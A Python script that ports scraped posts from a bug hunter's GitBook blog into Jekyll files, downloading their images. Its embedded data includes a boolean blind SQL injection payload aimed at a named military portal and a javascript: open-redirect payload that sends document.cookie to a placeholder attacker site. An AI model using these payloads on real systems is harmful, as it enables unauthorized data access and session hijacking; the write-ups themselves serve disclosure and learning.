import os
import json
import re
import requests
import shutil
from urllib.parse import unquote, urlparse, parse_qs

# Scraped Data from Batch 1 & 2
# I will embed the JSON data here directly for simplicity
data = [
  {
    "url": "https://unixtz.gitbook.io/blog",
    "title": "Iamunix | BugHunter | Hackers | iamunix",
    "content": "# Iamunix | BugHunter | Hackers\\n\\n### 🧠 Who Am I?\\n\\nHey there, fellow explorers of the digital abyss. I go by **Iamunixtz**, your friendly neighborhood bug hunter from Africa, still cruising under the age of 20s. This blog is my playground, my journal, and my confession booth a space where I’ll be documenting my journey through the chaotic, thrilling world of hacking and cracking...\\n\\n### 🧠 My Learning Stack\\n\\nI’m currently sharpening my skills in:\\n* **C**: The language of the gods.\\n* **Python**: My go-to for scripting.\\n* **Assembly**: The raw truth...\\n\\n### 🌍 Why This Blog?\\n\\nBecause hacking isn’t just about breaking things — it’s about understanding how they work...",
    "images": []
  },
  {
    "url": "https://unixtz.gitbook.io/blog/readme/bughunting",
    "title": "BugHunting | iamunix",
    "content": "# BugHunting\\n\\nMy Bug Hunting Journey: From Zero to Hero\\n\\n```\\n// \"Every expert was once a beginner. Every hacker once submitted an 'informative' bug.\"a\\n```\\n\\nHey there, fellow bughunters! 🐞 It's time to dive into the bug-hunting journey of someone who's been in your shoes—me!...\\n\\nChapter 1: The Humble Beginnings...\\nChapter 2: The Naive Submissions...\\nChapter 3: The First Real Catch...\\nChapter 5: The Game-Changer (September 4, 2024)...",
    "images": [
      "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FkElD74MquCKWtViUrEL8%252Fbugz.jpg?alt=media&token=59103ebc-466f-47a3-8ba5-3164918dfe28&width=768&dpr=4&quality=100&sign=e16fafab&sv=2",
      "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FxGfw482NgoSdxr7aFMxR%252Ffirstbounty.jpg?alt=media&token=29cc57ef-98f5-46cc-9c42-2ce43b180202&width=768&dpr=4&quality=100&sign=d63e0902&sv=2"
    ]
  },
  {
    "url": "https://unixtz.gitbook.io/blog/readme/bughunting/improper-access-control-user-information-exposure",
    "title": "Improper Access Control: User Information Exposure | iamunix",
    "content": "# Improper Access Control: User Information Exposure\\n\\n![image](https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FOojnh72QThN1nSFX68uO%252Fbg1.jpg?alt=media&token=9cdf4685-c085-436a-bcfb-99c9d6ca8b0f&width=768&dpr=4&quality=100&sign=53b60349&sv=2)\\n\\n## Hey everyone!\\n\\nI stumbled upon a vulnerability on sample.com—an Improper Access Control that was leaking sensitive user information.\\n\\n### The Vulnerable Endpoints:\\n* **Users Endpoint:** Revealed detailed information about all users (email, phone, login activity).\\n* **Videos Endpoint:** Exposed private videos to authenticated users.\\n* **Comments Endpoint:** Provided info about all comments and user IDs...\\n\\n### Discovery\\nI found unauthenticated access was possible for these endpoints, and regular user accounts could gain admin-level data access.",
    "images": [
      "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FOojnh72QThN1nSFX68uO%252Fbg1.jpg?alt=media&token=9cdf4685-c085-436a-bcfb-99c9d6ca8b0f&width=768&dpr=4&quality=100&sign=53b60349&sv=2"
    ]
  },
  {
    "url": "https://unixtz.gitbook.io/blog/readme/bughunting/the-thrilling-hunt-for-a-boolean-based-blind-sql-injection",
    "title": "The Thrilling Hunt for a Boolean-Based Blind SQL Injection | iamunix",
    "content": "# The Thrilling Hunt for a Boolean-Based Blind SQL Injection\\n\\n![image](https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FsHt2AlR0YBKJmwNwn458%252Fsqlbg.jpg?alt=media&token=24b6884b-505b-46b6-b54f-f58c261a9830&width=768&dpr=4&quality=100&sign=c9e6df1d&sv=2)\\n\\n**Hey everyone!**\\n\\nI uncover a hidden gem—a boolean-based blind SQL injection vulnerability on `https://portal.sddc.army.mil/` in the `User-Agent` headers.\\n\\n### The Impact:\\n* **Information Disclosure:** Attackers could infer database schema details.\\n* **Tech Stack:** MySQL 8, Windows, Microsoft SharePoint 16.0.0.5452.\\n\\n### The Hunt:\\n* **Payload:** `Mozilla/5.0 ... Safari/523.10' AND 8074=8074-- KwOG`",
    "images": [
      "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FsHt2AlR0YBKJmwNwn458%252Fsqlbg.jpg?alt=media&token=24b6884b-505b-46b6-b54f-f58c261a9830&width=768&dpr=4&quality=100&sign=c9e6df1d&sv=2"
    ]
  },
  {
    "url": "https://unixtz.gitbook.io/blog/readme/bughunting/open-redirect-to-account-takeover",
    "title": "Open Redirect To Account TakeOver | iamunix",
    "content": "# Open Redirect To Account TakeOver\\n\\nToday, I'm thrilled to share my adventure of discovering a critical flaw in the MyTrainPal website—an open redirect vulnerability that could potentially lead to account takeover.\\n\\n**The Discovery:**\\nA vulnerability in the `next` parameter of the login URL.\\n\\n**Proof of Concept (POC):**\\n`https://www.mytrainpal.com/signin?next=[MALICIOUS_WEBSITE]`\\n\\n**The Exploitation:**\\nBy injecting a JavaScript payload into the `next` parameter, I was able to steal cookies from a logged-in user.\\n\\n**Example payload:**\\n`https://www.mytrainpal.com/signin?next=j%09avascript:document.location='http://{attackersite.com}/'+document.cookie`",
    "images": [
      "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FAgu3taMcTH9UOnyWZRHo%252F20250126_204848.jpg?alt=media&token=a3e22ee8-9cf1-4cbb-bd3b-e2e53b421fd3&width=768&dpr=4&quality=100&sign=9afcfaff&sv=2",
      "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252F9hKRY8o0GhEDvIjAYLsn%252Fimage.png?alt=media&token=725f4b03-1435-4580-a41b-c37df3bd46f7&width=768&dpr=4&quality=100&sign=a9e9df42&sv=2",
      "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FXSerIwEyiqEfc8T55Edv%252Fimage.png?alt=media&token=c5195716-22e3-445c-bd50-f2b336ef8599&width=768&dpr=4&quality=100&sign=b234f9d&sv=2"
    ]
  },
  {
        "url": "https://unixtz.gitbook.io/blog/readme/bughunting/exposing-broken-access-control-in-salesforce-how-public-aura-endpoints-leaked-sensitive-data",
        "title": "Exposing Broken Access Control in Salesforce: How Public Aura Endpoints Leaked Sensitive Data | iamunix",
        "content": "* [Iamunix | BugHunter | Hackers](https://unixtz.gitbook.io/blog)\\n* [BugHunting](https://unixtz.gitbook.io/blog/readme/bughunting)\\n# Exposing Broken Access Control in Salesforce: How Public Aura Endpoints Leaked Sensitive Data\\n\\nHow I Discovered a Broken Access Control Vulnerability that Leaked Sensitive Data\\n\\n![image](https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FZnvfKG0NRSuid0mS8UqB%252Fimage.png%3Falt%3Dmedia%26token%3D579ada7e-c530-4834-813f-290662d3ed5e&width=768&dpr=4&quality=100&sign=76dddd1&sv=2)\\n\\nHello Folks \\n\\nWhile exploring Salesforce deployments during a focused research session, I uncovered a significant misconfiguration that allowed **unauthenticated access to internal Salesforce data** through publicly exposed Aura endpoints.\\n\\n...\\n\\n[PreviousOpen Redirect To Account TakeOver](https://unixtz.gitbook.io/blog/readme/bughunting/open-redirect-to-account-takeover)[NextHow I Found a Stored XSS That Led to Account Takeover on a Web3 Platform](https://unixtz.gitbook.io/blog/readme/bughunting/how-i-found-a-stored-xss-that-led-to-account-takeover-on-a-web3-platform)",
        "images": ["https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FZnvfKG0NRSuid0mS8UqB%252Fimage.png%3Falt%3Dmedia%26token%3D579ada7e-c530-4834-813f-290662d3ed5e&width=768&dpr=4&quality=100&sign=76dddd1&sv=2"]
    },
    {
        "url": "https://unixtz.gitbook.io/blog/readme/bughunting/how-i-found-a-stored-xss-that-led-to-account-takeover-on-a-web3-platform",
        "title": "How I Found a Stored XSS That Led to Account Takeover on a Web3 Platform | iamunix",
        "content": "* [Iamunix | BugHunter | Hackers](https://unixtz.gitbook.io/blog)\\n* [BugHunting](https://unixtz.gitbook.io/blog/readme/bughunting)\\n# How I Found a Stored XSS That Led to Account Takeover on a Web3 Platform\\n\\n## \\n\\n![image](https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252F8T4dm8f0RrqfaduUGG8U%252Fthsn.jpg%3Falt%3Dmedia%26token%3D1af3c410-a3c4-4648-a0c8-84570b3c53db&width=768&dpr=4&quality=100&sign=b1a9b13a&sv=2)\\n\\nHey hunters, hope you’re all doing well.\\nToday I want to share my story about how I discovered a Stored XSS vulnerability that allowed full account takeover (ATO) on a Web3 website.\\n\\n...\\n\\n[PreviousExposing Broken Access Control in Salesforce: How Public Aura Endpoints Leaked Sensitive Data](https://unixtz.gitbook.io/blog/readme/bughunting/exposing-broken-access-control-in-salesforce-how-public-aura-endpoints-leaked-sensitive-data)[NextNoob Researching 0 day and N day Bugs.](https://unixtz.gitbook.io/blog/readme/noob-researching-0-day-and-n-day-bugs.)",
        "images": [
            "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252F8T4dm8f0RrqfaduUGG8U%252Fthsn.jpg%3Falt%3Dmedia%26token%3D1af3c410-a3c4-4648-a0c8-84570b3c53db&width=768&dpr=4&quality=100&sign=b1a9b13a&sv=2",
            "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FjMmtP2Vw9WYRMz5snKGi%252Fblindxss.jpg%3Falt%3Dmedia%26token%3D262ce5f4-b396-4473-bb09-c5643e6d5335&width=768&dpr=4&quality=100&sign=f0271f04&sv=2",
            "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FbTE2TUaW85rwVhWriQdm%252Frxss.jpg%3Falt%3Dmedia%26token%3Dd7fe1e48-5c24-44d6-9c30-1a39f3d3a28c&width=768&dpr=4&quality=100&sign=61c2b4e2&sv=2",
            "https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FX9qGX7BagJ9W2LlaPKIN%252Fxssreport.jpg%3Falt%3Dmedia%26token%3D034f511d-3559-432f-b405-ddebf67ecc3b&width=768&dpr=4&quality=100&sign=5eb2b504&sv=2"
        ]
    },
    {
        "url": "https://unixtz.gitbook.io/blog/readme/noob-researching-0-day-and-n-day-bugs.",
        "title": "Noob Researching 0 day and N day Bugs. | iamunix",
        "content": "# Noob Researching 0 day and N day Bugs.\\n\\n[Burpsuite Pwn](https://unixtz.gitbook.io/blog/readme/noob-researching-0-day-and-n-day-bugs./burpsuite-pwn)[PreviousHow I Found a Stored XSS That Led to Account Takeover on a Web3 Platform](https://unixtz.gitbook.io/blog/readme/bughunting/how-i-found-a-stored-xss-that-led-to-account-takeover-on-a-web3-platform)[NextBurpsuite Pwn](https://unixtz.gitbook.io/blog/readme/noob-researching-0-day-and-n-day-bugs./burpsuite-pwn)",
        "images": []
    },
    {
        "url": "https://unixtz.gitbook.io/blog/readme/noob-researching-0-day-and-n-day-bugs./burpsuite-pwn",
        "title": "Burpsuite Pwn | iamunix",
        "content": "# Burpsuite Pwn\\n\\n### **Hello, folks!**\\n\\nI’m a bug hunter, and, well, I was bored. My HackerOne profile was looking kinda sad with no fresh bounties, so I thought, \"Why not do some noob research and see what happens?\" So here we are. I went down the rabbit hole of Burp Suite extensions and stumbled upon something that could turn Burp into a full-blown attack vector. Buckle up—this one’s gonna be fun.\\n\\n...\\n\\n[PreviousNoob Researching 0 day and N day Bugs.](https://unixtz.gitbook.io/blog/readme/noob-researching-0-day-and-n-day-bugs.)[NextLearing Red Team - Journey](https://unixtz.gitbook.io/blog/readme/interactive-blocks)",
        "images": ["https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FI5CyZXMlNA7p3dflAhX3%252FScreenshot%25202025-02-26%2520164749.png%3Falt%3Dmedia%26token%3D66f52d09-beb6-4308-b86e-bc2c75e5d933&width=768&dpr=4&quality=100&sign=dce14f9d&sv=2"]
    },
    {
        "url": "https://unixtz.gitbook.io/blog/readme/interactive-blocks",
        "title": "Learing Red Team - Journey | iamunix",
        "content": "# Learing Red Team - Journey\\n\\n![image](https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FK5OBu2GFZrNHBy8wbnSu%252Fsam.jpg%3Falt%3Dmedia%26token%3D3c7c4644-e997-474c-aead-066933227566&width=768&dpr=4&quality=100&sign=18a8b6f&sv=2)\\n\\n[ are supported natively](https://iframely.com/).\\n\\n[PreviousBurpsuite Pwn](https://unixtz.gitbook.io/blog/readme/noob-researching-0-day-and-n-day-bugs./burpsuite-pwn)",
        "images": ["https://unixtz.gitbook.io/blog/~gitbook/image?url=https%3A%2F%2F3236377954-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FLnNsONrppSfobRJorbOd%252Fuploads%252FK5OBu2GFZrNHBy8wbnSu%252Fsam.jpg%3Falt%3Dmedia%26token%3D3c7c4644-e997-474c-aead-066933227566&width=768&dpr=4&quality=100&sign=18a8b6f&sv=2"]
    }
]

POSTS_DIR = "_posts"
IMG_DIR = "assets/img"
FAVICON_DIR = "assets/img/favicons"

os.makedirs(IMG_DIR, exist_ok=True)
os.makedirs(FAVICON_DIR, exist_ok=True)

# 1. Setup Favicon
avatar_src = os.path.join(IMG_DIR, "avatar.jpeg")
if os.path.exists(avatar_src):
    # Copy avatar to favicon.ico (simple fallback)
    shutil.copy(avatar_src, os.path.join(FAVICON_DIR, "favicon.ico"))
    # Also create a png version as apple-touch-icon
    shutil.copy(avatar_src, os.path.join(FAVICON_DIR, "apple-touch-icon.png"))
    shutil.copy(avatar_src, os.path.join(FAVICON_DIR, "favicon-32x32.png"))
    shutil.copy(avatar_src, os.path.join(FAVICON_DIR, "favicon-16x16.png"))
    print("Favicons configured from avatar.")

# 2. Update Content
def download_image(url, filename):
    try:
        # GitBook Image Proxy handling
        if "gitbook.io" in url and "url=" in url:
             parsed = urlparse(url)
             query = parse_qs(parsed.query)
             if 'url' in query:
                 # extracting the actual source image url
                 url = query['url'][0]
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        response = requests.get(url, headers=headers, stream=True)
        response.raise_for_status()
        with open(os.path.join(IMG_DIR, filename), 'wb') as out_file:
            shutil.copyfileobj(response.raw, out_file)
        return True
    except Exception as e:
        print(f"Failed to download image {url}: {e}")
        return False

# Map titles or slugs to existing files
existing_files = os.listdir(POSTS_DIR)

for entry in data:
    title = entry['title'].split(" | ")[0].strip()
    
    # Clean up content: remove GitBook nav links
    content = entry['content']
    # Remove navigation lines like "[Previous...](...) [Next...](...)"
    content = re.sub(r'\[Previous.*?\]\(.*?\)', '', content)
    content = re.sub(r'\[Next.*?\]\(.*?\)', '', content)
    # Remove top nav
    content = re.sub(r'\* \[Iamunix.*?\]\(.*?\)\n', '', content)
    content = re.sub(r'\* \[BugHunting.*?\]\(.*?\)\n', '', content)
    
    # Process Images
    for i, img_url in enumerate(entry['images']):
        filename = f"{title.lower().replace(' ', '_')[:20]}_{i}.jpg"
        # Only download if valid url
        if img_url.startswith("http"):
            if download_image(img_url, filename):
                content = content.replace(img_url, f"/assets/img/{filename}")
    
    # Manual Mapping for missed ones
    match_file = None
    if "Stored XSS" in title:
         for f in existing_files:
             if "stored-xss" in f:
                 match_file = f
                 break
    elif "Iamunix" in title:
        print("Skipping Homepage update as it is not a post.")
        continue
    else:
        # Improved matching: strip non-alphanumeric from keywords
        slug_keywords = [
            re.sub(r'[^a-z0-9]', '', kw) 
            for kw in title.lower().split()[:4] # Check first 4 words
            if re.sub(r'[^a-z0-9]', '', kw)
        ]
        
        for file in existing_files:
            file_clean = file.replace("-", " ")
            # Require at least 2 keywords to match if possible, or 1 if title is short
            matches = sum(1 for kw in slug_keywords if kw in file_clean)
            if matches >= min(len(slug_keywords), 2):
                match_file = file
                break
            
    if match_file:
        file_path = os.path.join(POSTS_DIR, match_file)
        with open(file_path, "r") as f:
            old_content = f.read()
            
        # Extract existing front matter
        fm_match = re.match(r"(---[\s\S]*?---\n)", old_content)
        if fm_match:
            front_matter = fm_match.group(1)
            new_full_content = front_matter + "\n" + content
            
            with open(file_path, "w") as f:
                f.write(new_full_content)
            print(f"Updated {match_file}")
    else:
        print(f"No match found for {title}")

print("Content update complete.")
